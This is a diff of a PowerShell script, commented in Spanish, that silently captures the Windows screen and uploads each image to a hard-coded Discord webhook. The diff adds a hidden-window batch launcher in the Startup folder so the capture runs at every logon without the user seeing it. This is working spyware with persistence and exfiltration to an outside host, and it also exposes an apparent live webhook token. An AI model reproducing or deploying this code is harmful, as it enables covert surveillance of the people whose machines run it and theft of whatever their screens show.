@@ -1,6 +1,9 @@
 # Función para capturar y enviar la captura de pantalla al webhook
 function CaptureAndSendScreenshot {
-    # Definir la ruta del archivo temporal de la captura de pantalla
+    # Definir la URL del webhook
+    $webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
+
+    # Definir la archivo temporal de la captura de pantalla
     $screenshotFile = "$env:TEMP\SC.png"
 
     # Capturar la pantalla y guardarla en el archivo temporal
@@ -20,31 +23,15 @@ function CaptureAndSendScreenshot {
     Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $screenshotFile
 }
 
-# Definir la URL del webhook
-$webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
+# Ejecutar la función de captura de pantalla una vez
+CaptureAndSendScreenshot
 
-# Definir la cantidad de capturas de pantalla a enviar
-$numberOfScreenshots = 2
+# Crear un archivo por lotes (batch) para ejecutar el script en segundo plano
+$batchScriptPath = "$env:TEMP\RunInvisible.bat"
+$batchScriptContent = "@echo off`npowershell.exe -WindowStyle Hidden -File `"$PSCommandPath`""
+$batchScriptContent | Out-File -FilePath $batchScriptPath -Encoding ASCII
 
-# Definir el intervalo de tiempo entre capturas (en segundos)
-$intervalSeconds = 30
-
-# Realizar capturas de pantalla y enviarlas al webhook
-for ($i = 1; $i -le $numberOfScreenshots; $i++) {
-    CaptureAndSendScreenshot
-    Start-Sleep -Seconds $intervalSeconds
-}
-
-# Copiar el script a la carpeta de inicio de Windows
-$scriptPath = $MyInvocation.MyCommand.Path
+# Copiar el archivo por lotes a la carpeta de inicio de Windows
 $startupFolder = [Environment]::GetFolderPath("Startup")
-$scriptDestination = Join-Path -Path $startupFolder -ChildPath "Screenshot_Script.ps1"
-Copy-Item -Path $scriptPath -Destination $scriptDestination -Force
-
-# Crear un acceso directo en la carpeta de inicio de Windows para ejecutar el script
-$shortcutPath = Join-Path -Path $startupFolder -ChildPath "Screenshot_Script.lnk"
-$wScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $wScriptShell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = "-WindowStyle Hidden -File `"$scriptDestination`""
-$shortcut.Save()
+$batchScriptDestination = Join-Path -Path $startupFolder -ChildPath "RunInvisible.bat"
+Copy-Item -Path $batchScriptPath -Destination $batchScriptDestination -Force
